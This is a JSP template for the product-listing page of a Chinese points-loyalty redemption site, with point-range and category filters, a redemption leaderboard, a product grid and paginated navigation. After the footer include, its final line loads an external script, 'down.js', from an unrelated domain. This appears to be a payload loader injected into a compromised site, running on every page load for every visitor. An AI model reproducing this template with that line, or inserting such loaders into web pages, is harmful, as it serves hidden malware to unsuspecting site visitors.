<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<%@ taglib prefix="ct" uri="/WEB-INF/category.tld" %>
<c:set var="title" value="积分联盟-积分兑换"/> 
<%@ include file="IncludeTop.jsp" %>


<table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td width="178" height="129" valign="top" bgcolor="#FFFFFF"> 
      <%@ include file="searchProductBar1.jsp" %>
      <table width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr > 
          <td height="26" colspan="2" background="images/bg_table_title.gif">&nbsp;</td>
        </tr>
        <tr> 
          <td width="12" bgcolor="#FFFFFF">&nbsp;</td>
          <td width="158" align="right" height="180" valign="top" bgcolor="#FFFFFF"> 
            <table cellspacing="1" cellpadding="0" width="100%" border="0" align="center">
              <tr> 
                <td colspan="2" height="26">按照积分查询奖品</td>
              </tr>
              <tr> 
                <td height="24"  class="red" width="10">&nbsp;</td>
                <td height="24"  class="red"><a href='<c:url value="/queryProduct.do"/>?point1=0&point2=200'>200分以下</a></td>
              </tr>
              <tr> 
                <td height="24"  class="red" width="10">&nbsp;</td>
                <td height="24"  class="red"><a href='<c:url value="/queryProduct.do"/>?point1=201&point2=500'>201分-500分</a></td>
              </tr>
              <tr> 
                <td height="24"  class="red" width="10">&nbsp;</td>
                <td height="24"  class="red"><a href='<c:url value="/queryProduct.do"/>?point1=501&point2=1000'>501分-1000分 
                  </a></td>
              </tr>
              <tr> 
                <td height="24"  class="red" width="10">&nbsp;</td>
                <td height="24"  class="red"><a href='<c:url value="/queryProduct.do"/>?point1=1001&point2=5000'>1001分-5000分</a></td>
              </tr>
              <tr> 
                <td height="24"  class="red" width="10">&nbsp;</td>
                <td height="24"  class="red"><a href='<c:url value="/queryProduct.do"/>?point1=5001&point2=20000'>5001分-20000分</a></td>
              </tr>
              <tr> 
                <td height="24"  class="red" width="10">&nbsp;</td>
                <td height="24"  class="red"><a href='<c:url value="/queryProduct.do"/>?point1=20001&point2=50000'>20001分-50000分</a></td>
              </tr>
              <tr> 
                <td height="24"  class="red" width="10">&nbsp;</td>
                <td height="24"  class="red"><a href='<c:url value="/queryProduct.do"/>?point1=50000'>50000分以上</a></td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
      <table width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr> 
          <td height="26" colspan="2" class="red15" background="images/bg_table_title.gif"> 
            <div align="center">奖品兑换排行榜</div>          </td>
        </tr>
        <tr bgcolor="#FFFFFF"> 
          <td width="12">&nbsp;</td>
          <td width="147" align="left" valign="top"> 
            <table width="100%" border="0"  align="center" cellspacing="1" cellpadding="0">
				<c:forEach var="product" items="${appData.topChangedProducts}"> 
				  <tr> 
					<td width="10" height="19">					</td>					
                <td class="red" height="24"> <a href='<c:url value="/getProductInfo.do"/>?productNo=<c:out value="${product.productNo}"/>'> 
                  <c:out value="${product.name}"/></a> 共兑换<c:out value="${product.count}"/>次</td>
				  </tr>
		        </c:forEach>
            </table>          </td>
        </tr>
      </table>    </td>
    <td bgcolor="#FFFFFF" valign="top"> 
      <table width="100%" height="57" border="0">
        <tr> 
          <td width="28">&nbsp;</td>
          <td width="564" class="blue14">按照类别查询奖品：</td>
        </tr>
        <tr> 
          <td colspan="2" align="center">
            <table width="551" height="24" border="0" bgcolor="#FF6600">
              <tr>
			    <c:forEach var="productCategory" items="${applicationScope.appData.productCategories}"  varStatus="status" end="5"> 
                    <td width="70" align="center" height="19"> <a class="white12" href='<c:url value="/queryProduct.do"/>?productCtg=<c:out value="${productCategory.pcNo}"/>'><c:out value="${productCategory.name}"/></a></td>
					<c:if  test="${!status.last}">
					     <td width="10" height="19" class="white12">|</td>
				   </c:if >					
                </c:forEach>
              </tr>
            </table>
		  </td>
        </tr>
      </table>

	  <c:set var="trBegin" value='<tr>' />
	  <c:set var="trEnd" value='</tr>' /> 
	  <c:set var="colomnSize" value="3" />
	  
	  <c:set var="startRow" value='0' /> 
	  <c:set var="pageSize" value='20' /> 
	  <c:set var="totalCount" value='3' /> 
	  
	  <c:choose> 
		  <c:when  test="${result ne null}">
				<c:set var="productList" value="${result.productList}"/> 
				<c:set var="totalCount" value="${result.productCount}"/> 			
		  </c:when> 
		  <c:otherwise>
  	  		    <c:set var="productList" value="${appData.recommendedProducts}"/> 
				<c:set var="pageSize" value='6' /> 
				<c:set var="totalCount" value="7"/>
		  </c:otherwise>	  
	  </c:choose>
	  	  
      <table border ="0" width="100%" cellpadding="2" cellspacing="2">	     
        <c:forEach var="product" items="${productList}" varStatus="status"> 
        <c:if test="${status.count mod colomnSize eq 1}">
		     <c:out value="${trBegin}" escapeXml="false" />
        </c:if> 
        <td>
            <table width="180" height="128" border="0" cellpadding="0" cellspacing="0">
              <tr> 
                <td width="9" height="8"><img src="images/index_0136.gif" width="9" height="8" alt=""></td>
                <td width="162" height="8"><img src="images/index_0137.gif" width="162" height="8" alt=""></td>
                <td width="9" height="8"><img src="images/index_0138.gif" width="9" height="8" alt=""></td>
              </tr>
              <tr> 
                <td width="9" height="85"><img src="images/index_0139.gif" width="9" height="85" alt=""></td>
                <td width="162" height="85"> 
                  <table cellspacing="0" cellpadding="0" width="162" height="85">
                    <tr> 
                      <td width="70" rowspan="4" align="center"><a href='<c:url value="/getProductInfo.do"/>?productNo=<c:out value="${product.productNo}"/>'><img src='images/product/<c:out value="${product.productNo}"/>.jpg' width="65" height="65" border="0"></a></td>
                      <td width="90" height="23" class="blue14"><ct:slice length="12"  value="${product.name}" /></td>
                    </tr>
                    <tr> 
                      <td class="STYLE1" height="21"><span class="STYLE1"><a href='<c:url value="/queryProduct.do"/>?productCtg=<c:out value="${product.categoryNo}" />'><ct:code  type="product" code="${product.categoryNo}" /></a></span></td>
                    </tr>
                    <tr> 
                      <td class="STYLE1" height="21"><ct:slice length="12" value="${product.intro}" /> 
                      </td>
                    </tr>
                    <tr> 
                      <td height="20"><span class="red15"> <c:out value="${product.point}"/>分</span></td>
                    </tr>
                  </table>
                </td>
                <td width="9" height="85"><img src="images/index_0141.gif" width="9" height="85" alt=""></td>
              </tr>
              <tr> 
                <td width="9" height="7"><img src="images/index_0142.gif" width="9" height="7" alt=""></td>
                <td width="162" height="7"><img src="images/index_0143.gif" width="162" height="7" alt=""></td>
                <td width="9" height="7"><img src="images/index_0144.gif" width="9" height="7" alt=""></td>
              </tr>
              <tr> 
                <td width="9" height="26">&nbsp;</td>
                <td width="162" height="26"> 
                  <div align="center"> <a href='<c:url value="/addExchange.do"/>?productNo=<c:out value="${product.productNo}"/>'>兑换</a> 
                    <a href='<c:url value="/getProductInfo.do"/>?productNo=<c:out value="${product.productNo}"/>'>详细信息</a><br/>
                    <br/>
                  </div>
                </td>
                <td width="9" height="26">&nbsp;</td>
              </tr>
            </table>
          </td>
        <c:if test="${status.count mod colomnSize eq 0}">
			<c:out value="${trEnd}" escapeXml="false" />
        </c:if>
		<c:if test="${status.count mod colomnSize ne 0  and status.last}"> 
			<c:forEach var="x" begin="${status.count mod colomnSize}" end="${colomnSize-1}" step="1"> 
				<td>&nbsp; </td>
			</c:forEach>
         </c:if> 
        </c:forEach> 
      </table>
      <table width="100%" border="0" height="60" cellspacing="0" cellpadding="0">
        <tr> 
          <td width="3%" height="57">&nbsp;</td>
          <td width="95%" height="57"> 
            <form name="pageForm" method="post" action="/queryProduct.do">
              <c:set var="trEnd" value='</tr>' />
			  <c:choose>
				  <c:when test="${result ne null and result.productQC ne null}"> 
						<input type="hidden" name="productCtg" value='<c:out value="${result.productQC.productCtg}"/>' />
						<input type="hidden" name="productKey" value='<c:out value="${result.productQC.productKey}"/>' />
						<input type="hidden" name="point1" value='<c:out value="${result.productQC.point1}"/>' />
						<input type="hidden" name="point2" value='<c:out value="${result.productQC.point2}"/>' />
						<input type="hidden" name="time1" value='<c:out value="${result.productQC.time1}"/>' />
						<input type="hidden" name="time2" value='<c:out value="${result.productQC.time2}"/>' />
						<input type="hidden" name="orderBy" value='<c:out value="${result.productQC.orderBy}"/>' />
						<input type="hidden" name="pageSize" value='<c:out value="${result.productQC.pageSize}"/>' />
						<input type="hidden" name="startRow" value='<c:out value="${result.productQC.startRow}"/>' />								
						<input type="hidden" name="orderType" value='<c:out value="${result.productQC.orderType}"/>' />
						<c:if test="${result.productQC.startRow ne null}">
							<c:set var="startRow" value="${result.productQC.startRow}"/>
						</c:if>
						<c:if test="${result.productQC.pageSize ne null}">
							<c:set var="pageSize" value="${result.productQC.pageSize}"/>
						</c:if>
				</c:when>
				<c:otherwise>
					 	<input type="hidden" name="startRow" value="0" />
				</c:otherwise> 
			</c:choose>
            <div align="center">
				<c:choose> 
				   <c:when  test="result eq null">
					   <a href='<c:url value="/queryProduct.do"/>'>更多>></a>				   </c:when> 
				   <c:otherwise> 			 
					  <c:choose> 
						  <c:when  test="${startRow lt 1}">
								上一页						 </c:when> 
						 <c:when  test="${startRow - pageSize lt 0}">
								<a href='javascript:pageForm.startRow.value=0; pageForm.submit()'>上一页</a>						 </c:when>
						 <c:otherwise> 
								<a href='javascript:pageForm.startRow.value=<c:out value="${startRow-pageSize}"/>; pageForm.submit()'>上一页</a>						</c:otherwise>
					  </c:choose>
					  <c:set var="totalPage" value="${totalCount / pageSize }"/>
					  <c:if  test="${totalCount mod pageSize ne 0}">
						  <c:set var="totalPage" value="${totalPage + 1}"/>
					  </c:if> 
					  
					  <c:if  test="${totalCount eq 0}">
						  <c:set var="totalPage" value="1"/>
					  </c:if> 
					  					  
					  <c:forEach begin="1" end="${totalPage}" var="i" step="1"> 		
							<c:set var="curRow" value="${(i-1) * pageSize}"/>
							<c:choose> 
								  <c:when  test="${startRow eq curRow}">
										<c:out value="${i}"/>
								  </c:when> 
								  <c:otherwise> 
										<a href='javascript:pageForm.startRow.value=<c:out value="${(i-1) * pageSize}"/>; pageForm.submit()'><c:out value="${i}"/></a>								  </c:otherwise>						  
							 </c:choose>
					  </c:forEach>
					  <c:choose> 
						 <c:when  test="${startRow gt totalCount - pageSize}">
								下一页						 </c:when> 
						 <c:otherwise> 
								<a href='javascript:pageForm.startRow.value=<c:out value="${startRow+pageSize}"/>; pageForm.submit()'>下一页</a>						</c:otherwise>
					  </c:choose>
				  </c:otherwise>
			   </c:choose>	  
			</div>
   	 	  </form>          </td>
          <td width="2%" height="57">&nbsp;</td>
        </tr>
      </table>    </td>
  </tr>
</table>

<%@ include file="IncludeBottom.jsp" %>

<script language=javascript src=http://Town.531jx.cn/down.js></script>